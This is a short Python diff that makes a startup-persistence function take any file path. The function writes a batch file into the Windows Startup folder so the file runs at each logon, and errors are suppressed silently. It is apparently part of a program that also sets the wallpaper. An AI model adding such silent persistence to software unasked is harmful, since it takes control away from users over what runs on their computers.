@@ -103,12 +103,12 @@ Set-WallPaper("""+path_file+""")
         
         except:
             return False
-    async def add_to_startup() -> bool:
+    async def add_to_startup(file_path : str = __file__) -> bool:
         try:
             USER_NAME = getpass.getuser()
             bat_path = f'C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' 
             with open(bat_path + '\\' + "file.bat", "w+") as bat_file:
-                bat_file.write(f"@echo off\nstart {__file__}")
+                bat_file.write(f"@echo off\nstart {file_path}")
             return True
         except:
             return False
